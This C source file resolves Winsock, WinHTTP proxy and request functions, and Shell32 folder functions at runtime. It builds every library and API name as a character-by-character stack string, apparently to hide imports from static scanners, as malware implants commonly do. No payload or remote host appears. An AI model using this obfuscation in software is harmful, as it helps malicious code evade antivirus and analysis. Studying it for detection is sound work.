#include "api.h"

PDYNAMIC_WINHTTP dynamicWinHttp = NULL;
PDYNAMIC_WINSOCK dynamicWinsock = NULL;
PDYNAMIC_SHELL32 dynamicShell32 = NULL;

BOOL API_LoadWinsock(PDYNAMIC_WINSOCK* pDynamicWinsock)
{
	PDYNAMIC_WINSOCK dynamicWinsock = *pDynamicWinsock;

	if  (dynamicWinsock)
	{
		WCHAR strLib[] = {'W',  'S',  '2',  '_',  '3',  '2',  0x0};
		HMODULE hMod = NULL;
		
		if((hMod = LoadLibrary(strLib)) == NULL)
			return FALSE;

		CHAR strWSAStartup[] = {'W',  'S',  'A',  'S',  't',  'a',  'r',  't',  'u',  'p',  0x0};
		dynamicWinsock->fpWSAStartup = (WSASTARTUP) GetProcAddress(hMod, strWSAStartup);

		CHAR strWSACleanup[] = {'W',  'S',  'A',  'C',  'l',  'e',  'a',  'n',  'u',  'p', 0x0};
		dynamicWinsock->fpWSACleanup = (WSACLEANUP) GetProcAddress(hMod, strWSACleanup);
		
		CHAR strinet_addr[] = {'i',  'n',  'e',  't',  '_',  'a',  'd',  'd',  'r', 0x0};
		dynamicWinsock->fpinet_addr = (INET_ADDR) GetProcAddress(hMod, strinet_addr);
		
		CHAR strgethostbyname[] = {'g',  'e',  't',  'h',  'o',  's',  't',  'b',  'y',  'n',  'a',  'm',  'e', 0x0};
		dynamicWinsock->fpgethostbyname = (GETHOSTBYNAME) GetProcAddress(hMod, strgethostbyname);
		
		CHAR strinet_ntoa[] = { 'i',  'n',  'e',  't',  '_',  'n',  't',  'o',  'a', 0x0};
		dynamicWinsock->fpinet_ntoa = (INET_NTOA) GetProcAddress(hMod, strinet_ntoa);

		CHAR strntohl[] = { 'n',  't',  'o',  'h',  'l', 0x0};
		dynamicWinsock->fpntohl = (NTOHL) GetProcAddress(hMod, strntohl);

		if (
			!dynamicWinsock->fpWSAStartup ||
			!dynamicWinsock->fpinet_addr ||
			!dynamicWinsock->fpgethostbyname ||
			!dynamicWinsock->fpinet_ntoa ||
			!dynamicWinsock->fpntohl 
			)
			return FALSE;
		else
			return TRUE; 
	}
	return FALSE;
}

BOOL API_LoadWinHttp(PDYNAMIC_WINHTTP* pDynamicWinHttp)
{
	PDYNAMIC_WINHTTP dynamicWinHttp = *pDynamicWinHttp;
	
	if (dynamicWinHttp)
	{
		WCHAR strLib[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  0x0 };
		HMODULE hMod = NULL;
		
		if((hMod = LoadLibrary(strLib)) == NULL)
			return FALSE;

		CHAR strWinHttpSendRequest[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'S',  'e',  'n',  'd',  'R',  'e',  'q',  'u',  'e',  's',  't', 0x0 };
		dynamicWinHttp->fpWinHttpSendRequest = (WINHTTPSENDREQUEST) GetProcAddress(hMod, strWinHttpSendRequest);

		CHAR strWinhttpgetieproxyconfigforcurrentuser[] = {'W',  'i',  'n',  'H',  't',  't',  'p',  'G',  'e',  't',  'I',  'E',  'P',  'r',  'o',  'x',  'y',  'C',  'o',  'n',  'f',  'i',  'g',  'F',  'o',  'r',  'C',  'u',  'r',  'r',  'e',  'n',  't',  'U',  's',  'e',  'r',  0x0};
		dynamicWinHttp->fpWinhttpgetieproxyconfigforcurrentuser = (WINHTTPGETIEPROXYCONFIGFORCURRENTUSER) GetProcAddress(hMod, strWinhttpgetieproxyconfigforcurrentuser);
		
		CHAR strWinhttpsetoption[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'S',  'e',  't',  'O',  'p',  't',  'i',  'o',  'n', 0x0};
		dynamicWinHttp->fpWinhttpsetoption = (WINHTTPSETOPTION) GetProcAddress(hMod, strWinhttpsetoption);

		CHAR strWinhttpsettimeouts[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'S',  'e',  't',  'T',  'i',  'm',  'e',  'o',  'u',  't',  's', 0x0};
		dynamicWinHttp->fpWinhttpsettimeouts = (WINHTTPSETTIMEOUTS) GetProcAddress(hMod, strWinhttpsettimeouts);

		CHAR strWinhttpreceiveresponse[] = {'W',  'i',  'n',  'H',  't',  't',  'p',  'R',  'e',  'c',  'e',  'i',  'v',  'e',  'R',  'e',  's',  'p',  'o',  'n',  's',  'e',  0x0};
		dynamicWinHttp->fpWinhttpreceiveresponse = (WINHTTPRECEIVERESPONSE) GetProcAddress(hMod, strWinhttpreceiveresponse);

		CHAR strWinhttpconnect[] = {'W',  'i',  'n',  'H',  't',  't',  'p',  'C',  'o',  'n',  'n',  'e',  'c',  't',  0x0};
		dynamicWinHttp->fpWinhttpconnect = (WINHTTPCONNECT) GetProcAddress(hMod, strWinhttpconnect);
		
		CHAR strWinhttpopen[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'O',  'p',  'e',  'n', 0x0};
		dynamicWinHttp->fpWinhttpopen = (WINHTTPOPEN) GetProcAddress(hMod, strWinhttpopen);

		CHAR strWinhttpopenrequest[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'O',  'p',  'e',  'n',  'R',  'e',  'q',  'u',  'e',  's',  't', 0x0};
		dynamicWinHttp->fpWinhttpopenrequest = (WINHTTPOPENREQUEST) GetProcAddress(hMod, strWinhttpopenrequest);

		CHAR strWinhttpgetproxyforurl[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'G',  'e',  't',  'P',  'r',  'o',  'x',  'y',  'F',  'o',  'r',  'U',  'r',  'l', 0x0 };
		dynamicWinHttp->fpWinhttpgetproxyforurl = (WINHTTPGETPROXYFORURL ) GetProcAddress(hMod, strWinhttpgetproxyforurl);

		CHAR strWinhttpreaddata[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'R',  'e',  'a',  'd',  'D',  'a',  't',  'a',  0x0 };
		dynamicWinHttp->fpWinhttpreaddata = (WINHTTPREADDATA ) GetProcAddress(hMod, strWinhttpreaddata);

		CHAR strWinhttpclosehandle[] = {'W',  'i',  'n',  'H',  't',  't',  'p',  'C',  'l',  'o',  's',  'e',  'H',  'a',  'n',  'd',  'l',  'e',  0x0};
		dynamicWinHttp->fpWinhttpclosehandle = (WINHTTPCLOSEHANDLE) GetProcAddress(hMod, strWinhttpclosehandle);

		CHAR strWinhttpqueryheaders[] = { 'W',  'i',  'n',  'H',  't',  't',  'p',  'Q',  'u',  'e',  'r',  'y',  'H',  'e',  'a',  'd',  'e',  'r',  's', 0x0};
		dynamicWinHttp->fpWinhttpqueryheaders = (WINHTTPQUERYHEADERS) GetProcAddress(hMod, strWinhttpqueryheaders);

		if (
			!dynamicWinHttp->fpWinHttpSendRequest ||
			!dynamicWinHttp->fpWinhttpgetieproxyconfigforcurrentuser ||
			!dynamicWinHttp->fpWinhttpsetoption ||
			!dynamicWinHttp->fpWinhttpsettimeouts ||
			!dynamicWinHttp->fpWinhttpreceiveresponse ||
			!dynamicWinHttp->fpWinhttpopen ||
			!dynamicWinHttp->fpWinhttpopenrequest ||
			!dynamicWinHttp->fpWinhttpgetproxyforurl ||
			!dynamicWinHttp->fpWinhttpreaddata ||
			!dynamicWinHttp->fpWinhttpclosehandle ||
			!dynamicWinHttp->fpWinhttpqueryheaders
			)
			return FALSE;
		else
			return TRUE;
	}
	return FALSE;
}


BOOL API_LoadShell32(PDYNAMIC_SHELL32* pDynamicShell32)
{
	PDYNAMIC_SHELL32 dynamicShell32 = *pDynamicShell32;

	if  (dynamicShell32)
	{
		WCHAR strLib[] = {'S', 'H', 'E', 'L', 'L', '3', '2', 0x0};
		HMODULE hMod = NULL;
		
		if((hMod = LoadLibrary(strLib)) == NULL)
			return FALSE;
	
		CHAR strSHCreateShellItem[] = {'S',  'H',  'C',  'r',  'e',  'a',  't',  'e',  'S',  'h', 'e',  'l',  'l',  'I',  't',  'e',  'm', 0x0};
		dynamicShell32->fpSHCreateShellItem = (SHCREATESHELLITEM)GetProcAddress(hMod, strSHCreateShellItem);

		CHAR strSHParseDisplayName[] = {'S',  'H',  'P',  'a',  'r',  's',  'e',  'D',  'i',  's', 'p',  'l',  'a',  'y',  'N',  'a', 'm', 'e', 0x0};
		dynamicShell32->fpSHParseDisplayName = (SHPARSEDISPLAYNAME)GetProcAddress(hMod, strSHParseDisplayName);
		
		CHAR strSHGetSpecialFolderPathW[] = {'S',  'H',  'G',  'e',  't',  'S',  'p',  'e',  'c',  'i', 'a',  'l',  'F',  'o',  'l',  'd', 'e', 'r', 'P', 'a', 't', 'h', 'W', 0x0};
		dynamicShell32->fpSHGetSpecialFolderPathW = (SHGETSPECIALFOLDERPATHW)GetProcAddress(hMod, strSHGetSpecialFolderPathW);


		if (
			!dynamicShell32->fpSHCreateShellItem		||
			!dynamicShell32->fpSHParseDisplayName		||
			!dynamicShell32->fpSHGetSpecialFolderPathW	
			)
			return FALSE;
		else
			return TRUE; 
	}
	return FALSE;
}